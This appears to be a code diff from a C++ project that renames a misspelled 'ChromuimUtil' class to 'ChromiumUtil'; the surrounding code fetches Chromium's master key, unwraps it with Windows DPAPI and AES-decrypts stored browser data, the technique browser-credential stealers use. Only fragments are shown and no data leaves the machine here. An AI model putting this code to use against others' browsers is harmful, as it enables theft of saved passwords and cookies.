@@ -2,9 +2,9 @@
 // Created by .1qxz on 08.06.2024.
 //
 
-#include "ChromuimUtil.h"
+#include "ChromiumUtil.h"
 
-std::vector<BYTE> ChromuimUtil::getMasterKey(fs::path &path) {
+std::vector<BYTE> ChromiumUtil::getMasterKey(const fs::path &path) {
     if(!exists(path))
         return {};
 
@@ -34,8 +34,8 @@ std::vector<BYTE> ChromuimUtil::getMasterKey(fs::path &path) {
     return decoded_key;
 }
 
-std::string ChromuimUtil::decryptData(const std::vector<BYTE> &buffer, const std::vector<BYTE> &master_key) {
-    auto decrypted_key = ChromuimUtil::CryptUnprotectDataWrapper(master_key);
+std::string ChromiumUtil::decryptData(const std::vector<BYTE> &buffer, const std::vector<BYTE> &master_key) {
+    auto decrypted_key = ChromiumUtil::CryptUnprotectDataWrapper(master_key);
     std::vector<unsigned char> iv(buffer.begin() + 3, buffer.begin() + 15);
     std::vector<unsigned char> ciphertext(buffer.begin() + 15, buffer.end() - 16);
 
@@ -71,7 +71,7 @@ std::string ChromuimUtil::decryptData(const std::vector<BYTE> &buffer, const std
     return std::string(decrypted.begin(), decrypted.begin() + decryptedSize);
 }
 
-std::vector<BYTE> ChromuimUtil::CryptUnprotectDataWrapper(const std::vector<BYTE> &data) {
+std::vector<BYTE> ChromiumUtil::CryptUnprotectDataWrapper(const std::vector<BYTE> &data) {
     DATA_BLOB inData, outData;
     inData.pbData = const_cast<BYTE*>(data.data());
     inData.cbData = static_cast<DWORD>(data.size());
